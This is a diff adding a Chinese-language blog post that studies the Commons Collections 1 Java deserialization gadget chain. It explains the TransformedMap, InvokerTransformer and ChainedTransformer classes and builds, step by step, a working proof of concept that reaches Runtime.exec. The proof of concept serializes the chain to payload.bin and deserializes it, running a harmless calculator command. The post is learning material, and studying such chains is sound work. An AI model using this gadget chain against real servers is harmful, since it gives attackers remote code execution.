@@ -38,6 +38,148 @@
       </tags>
   </entry>
   <entry>
+    <title>Commons-Collections-1</title>
+    <url>/Commons-Collections-1/</url>
+    <content><![CDATA[<blockquote>
+<p>醉后不知天在水，满船清梦压星河。</p>
+</blockquote>
+<p>Commons Collections 1反序列化链学习</p>
+<span id="more"></span>
+
+
+
+<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>在jdk1.2中的更新，主要就是java Collections框架，自从变成java处理collection的标准之后，它强大的数据结构大大提高了开发应用的效率。</p>
+<p>Commons-Collections对原有的 java Collections进行了扩展增加，有许多新的特性，包括：</p>
+<ul>
+<li><p>Bag 接口，为有多个副本的集合对象提供接口</p>
+</li>
+<li><p>BidiMap接口，为maps提供值到键，键到值的查询接口</p>
+</li>
+<li><p>MapIterator，为maps的迭代器提供简单快速的接口</p>
+</li>
+<li><p><strong>每个对象在添加到集合中时，提供改变每个对象的装饰器</strong></p>
+</li>
+<li><p>使多个集合看起来像复合集合</p>
+<p>。。。。。。</p>
+</li>
+</ul>
+<p><strong>Commons Collections实现了一个TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。</strong></p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>commons.apache.org<span class="regexp">/proper/</span>commons-collections/index.html</span><br><span class="line">http:<span class="regexp">//</span>archive.apache.org<span class="regexp">/dist/</span>commons<span class="regexp">/collections/</span>binaries/</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-POC复现"><a href="#2-POC复现" class="headerlink" title="2. POC复现"></a>2. POC复现</h2><ol>
+<li><p>新建一个maven工程</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>网上流传的poc</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        <span class="comment">//outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span></span><br><span class="line">        onlyElement.setValue(<span class="string">&quot;foobar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="3-POC构造"><a href="#3-POC构造" class="headerlink" title="3. POC构造"></a>3. POC构造</h2><h3 id="3-1-直接调用"><a href="#3-1-直接调用" class="headerlink" title="3.1 直接调用"></a>3.1 直接调用</h3><p>看一下InvokerTransformer类的transform函数</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>简化一下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    Class cls = input.getClass();</span><br><span class="line">    Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>看一下对应的构造函数</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>通过构造的反射机制以及以上代码进行填空，可以得出当变量等于以下值时，可形成命令执行：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object input=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>));</span><br><span class="line"><span class="keyword">this</span>.iMethodName=<span class="string">&quot;exec&quot;</span></span><br><span class="line"><span class="keyword">this</span>.iParamTypes=String.class</span><br><span class="line"><span class="keyword">this</span>.iArgs=<span class="string">&quot;open -a calculator&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>通过函数调用POC就为：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.internal.xjc.reader.xmlschema.BindPurple;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Object input=Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;));</span></span><br><span class="line"><span class="comment"> * this.iMethodName=&quot;exec&quot;</span></span><br><span class="line"><span class="comment"> * this.iParamTypes=String.class</span></span><br><span class="line"><span class="comment"> * this.iArgs=&quot;open -a calculator&quot;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span></span><br><span class="line"><span class="comment"> *         this.iMethodName = methodName;</span></span><br><span class="line"><span class="comment"> *         this.iParamTypes = paramTypes;</span></span><br><span class="line"><span class="comment"> *         this.iArgs = args;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc01Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//通过构造函数，输入对应格式的参数，对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        InvokerTransformer invokertransformer = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> String[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建invokertransformer对象后调用transform方法</span></span><br><span class="line">        <span class="comment">//Object inputobj = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;));</span></span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        invokertransformer.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="3-2-同一个函数中进行序列化"><a href="#3-2-同一个函数中进行序列化" class="headerlink" title="3.2 同一个函数中进行序列化"></a>3.2 同一个函数中进行序列化</h3><p>使用文件写入，代替网络传输</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc01Demo2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//通过构造函数，输入对应格式的参数，对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        InvokerTransformer invokertransformer = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> String[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将invokertransformer作为文件输入流输出为payload.bin</span></span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutput objectOutput = <span class="keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line">        objectOutput.writeObject(invokertransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//从payload.bin读取invokertransformer</span></span><br><span class="line">        FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建invokertransformer对象后调用transform方法</span></span><br><span class="line">        <span class="comment">//Object inputobj = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;));</span></span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line"></span><br><span class="line">        InvokerTransformer payloadInput = (InvokerTransformer) objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        payloadInput.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="3-3-网络传输时"><a href="#3-3-网络传输时" class="headerlink" title="3.3 网络传输时"></a>3.3 网络传输时</h3><p>ChainedTransformer类中，</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里会遍历iTransformers数组，依次调用这个数组中每一个Transformer的transform，并串行传递执行结果。</p>
+<p>首先确定iTransformers可控，<strong>iTransformers数组</strong>是通过<strong>ChainedTransformer</strong>类的<strong>构造函数</strong>赋值的。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以通过创建一个ChainedTransformer对象来控制iTransformers数组</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>那我们就把payload封装成Transformer[]。然后作为构造函数的参数创建一个ChainedTransformer对象</p>
+<p>首先Transformer是一个接口</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object var1)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么我们封装payload的时候就要转换成Transformer的实现类。</p>
+<p>InvokerTransformer 继承了Transformer 和 Serializable</p>
+<p>ConstantTransformer也继承了Transformer</p>
+<p>这里用InvokerTransformer来改造poc</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc01Demo3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//客户端poc</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//服务端poc</span></span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        transformerChain.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>上述poc有个问题就是服务端需要我们创建一个Runtime对象，我们不可能控制服务端。所以我们需要在数组中进行串行调用。</p>
+<p>先获取Runtime对象，再通过Runtime对象执行方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc01Demo4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>那么如果我们反序列化呢</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc01Demo5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="comment">//new ConstantTransformer(Runtime.getRuntime()),</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>))),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化payload读取</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化成ChainedTransformer格式，并在服务端自主传入恶意参数input</span></span><br><span class="line">        Transformer transformerChain_now = (ChainedTransformer) fin.readObject();</span><br><span class="line">        transformerChain_now.transform(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>是会失败的，因为Runtime类没有继承Serializable，无法在服务端反序列化成功。</p>
+<p>既然我们没法在客户端序列化写入Runtime的实例，那就让服务端执行我们的命令生成一个Runtime实例</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cc01Demo06</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),<span class="comment">//得到Runtime class</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[]&#123;&#125;,<span class="keyword">new</span> Object[]&#123;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>最终的poc</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">POC0</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="comment">//1. 获取Runtime Class</span></span><br><span class="line">                <span class="comment">//new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;))</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化成ChainedTransformer格式，再调用transform函数</span></span><br><span class="line">        Transformer transformerChain_now = (ChainedTransformer) fin.readObject();</span><br><span class="line">        transformerChain_now.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
